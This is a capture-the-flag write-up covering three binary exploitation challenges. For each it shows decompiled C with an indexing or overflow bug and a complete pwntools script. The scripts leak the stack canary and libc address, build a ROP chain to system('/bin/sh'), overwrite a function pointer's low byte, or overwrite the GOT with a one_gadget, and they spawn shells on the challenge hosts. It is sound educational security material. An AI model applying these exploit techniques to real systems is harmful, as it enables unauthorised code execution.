## Exploitation Class

The program allocates a `char data[22][12];`  buffer on the stack, and we can
read and write it.

The vulnerability is here

```c  
unsigned __int64 __fastcall writeData(char *a1)  
{  
 unsigned int v2; // [rsp+4h] [rbp-14h]  
 unsigned __int64 v3; // [rsp+8h] [rbp-10h]

 v3 = __readfsqword(0x28u);  
 puts("Which entry to write?");  
 v2 = 0;  
 __isoc99_scanf("%u", &v2;;  
 if ( v2 <= 0xFC )  
 {  
   puts("What to write?");  
   read(0, &a1[12 * v2], 0xCuLL);  
 }  
 return __readfsqword(0x28u) ^ v3;  
}  
```

It ensures that index is `<= 0xfc`, however, it should be `idx * 12 <= 0xfc`,
so this leads to a index out of bound.

Also, there is no null termination here, so we can leak some data.

There is stack canary here, so we need to leak the canary and libc address.
Because we can read the last element of the array, we can fill all of the
bytes such that there is no null termination from the last element to the data
we want to leak. Then we can leak the data by showing the last element.

After leaking the data, it is very easy to ROP and execute the
`system("/bin/sh")`

```python  
from pwn import *

g_local=False  
context.log_level='debug'

if g_local:  
	sh = process("./exploitClass")#env={'LD_PRELOAD':'./libc.so.6'}  
	MAIN_RET_OFF = 0x20830  
	ONE_GADGET = 0x45216  
	POP_RDI = 0  
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")  
	gdb.attach(sh)  
else:  
	sh = remote("class.uni.hctf.fun", 24241)  
	#sh = process("./exploitClass", env={'LD_PRELOAD':'./libc.so.6'})  
	MAIN_RET_OFF = 0x24223  
	ONE_GADGET = 0x451F9 #0x45254  
	POP_RDI = 0x23BE3  
	e = ELF("./libc.so.6")

def read(idx):  
	sh.send("1\n")  
	sh.recvuntil("Which entry to show?\n")  
	sh.send(str(idx) + "\n")  
	ret = sh.recvuntil("\n")  
	sh.recvuntil("Enter 1 to read, 2 to write and any other number to exit!\n")  
	return ret[:-1]

def write(idx, data):  
	sh.send("2\n")  
	sh.recvuntil("Which entry to write?\n")  
	sh.send(str(idx) + "\n")  
	sh.recvuntil("What to write?\n")  
	sh.send(data)  
	sh.recvuntil("Enter 1 to read, 2 to write and any other number to exit!\n")

sh.recvuntil("Enter 1 to read, 2 to write and any other number to exit!\n")  
write(21, "B" * 12)  
write(22, "C")  
#write(24, "A" * 8 + '\xa0') #return to main  
canary = u64(read(21)[0xc:0xc+8]) - ord('C')  
print hex(canary)  
for i in xrange(0,4):  
	write(22 + i, "B" * 0xc)  
libc_addr = u64(read(21)[0x3c:0x3c+6] + "\x00\x00") - MAIN_RET_OFF

write(22, p64(canary))  
write(24, 'A' * 8 + p32((libc_addr + POP_RDI) & 0xffffffff))  
write(25, p32((libc_addr + POP_RDI) >> 0x20) + p64(libc_addr +
next(e.search("/bin/sh"))))  
write(26, p64(libc_addr + e.symbols["system"]))  
print hex(libc_addr)  
write(29, '\x00' * 0xc)  
sh.send("3\n")  
sh.interactive()  
```

## Important Service

0x401 0 can cause the buffer overflow, which can overwrite one lowest byte of
the function pointer in the stack

```c  
char vulnbuf[1024]; // [rsp+0h] [rbp-420h]  
int (__fastcall *func_addr)(char *, int, int); // [rsp+400h] [rbp-20h]  
//...  
fread(vulnbuf, 1uLL, (signed int)vullen, stdin);  
func_addr(vulnbuf, vullen, v7);  
```

Although there is PIE in this program, the lowest 12 bits will not change due
to the PIE. Initially the function pointer in the stack is `base_addr +
0x11BC`, and the shell function address is `base_addr + 0x11A9`, so if we
change `0xbc` to `0xa9`, the shell function will be called instead.

```python  
from pwn import *

g_local=False  
context.log_level='debug'  
store_idx = 0

if g_local:  
	sh = process("./importantservice")#env={'LD_PRELOAD':'./libc.so.6'}  
	gdb.attach(sh)  
else:  
	sh = remote("importantservice.uni.hctf.fun", 13375)

sh.recvuntil("Please enter width and height e.g.: 5 8\n")  
sh.send(str(0x401) + " 0\n")  
sh.recvuntil("Please provide some data e.g.: 12345\n")  
sh.send("A" * 0x400 + "\xa9")

sh.interactive()  
```

## Kindergarten PWN

In the program, an index is required to be given, and the program will show
the original byte at that index and let you to change it. The problem is that
it did not check the index must be `>=0`

```c  
if ( v5 <= 31 )//v5 < 0  
{  
  printf("the value at %d is %hhd. give me a new value:\n> ", (unsigned
int)v5, (unsigned int)array[v5]);  
  v3 = &v4;  
  if ( (unsigned int)__isoc99_scanf("%hhd", &v4) != 1 )  
    break;  
  array[v5] = v4;  
}  
```

and array is a global variable, and the got table can be overwritten, so we
can use this to leak the libc address and rewrite the got table to
`one_gadget`

```python  
from pwn import *

g_local=False  
context.log_level='debug'  
store_idx = 0

e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")  
if g_local:  
	sh = process("./kindergarten")#env={'LD_PRELOAD':'./libc.so.6'}  
	#sh = process(['ld.so.2', './user.elf'])  
	gdb.attach(sh)  
else:  
	sh = remote("kindergarten.uni.hctf.fun", 13373)  
	#ONE_GADGET_OFF = 0x4557a

def one_iter(idx, val = None):  
	sh.recvuntil("give me an index:\n> ")  
	sh.sendline(str(idx))  
	sh.recvuntil("the value at " + str(idx)+ " is ")  
	ret = sh.recvuntil(".")  
	sh.recvuntil(" give me a new value:\n> ")  
	ret = int(ret[:len(ret)-1])  
	if val:  
		sh.sendline(str(val))  
	else:  
		sh.sendline(str(ret))  
	return ret & 0xff

def leak_qword(off):  
	ret = 0  
	for i in xrange(0,8):  
		ret |= one_iter(off + i) << (8 * i)  
	return ret

def shoot_qword(off, val):  
	for i in xrange(0,8):  
		one_iter(off + i, (val >> (8 * i)) & 0xff)

libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols["printf"]  
#leak address of `printf`  
print hex(libc_addr)  
shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a) #0x30 one_gadget  
#rewirte the `exit` function to one_gadget  
sh.recvuntil("> ")  
sh.sendline("asd")

sh.interactive()  
```

Original writeup
(https://github.com/EmpireCTF/empirectf/tree/master/writeups/2018-10-26-P-W-N-
CTF#important-service).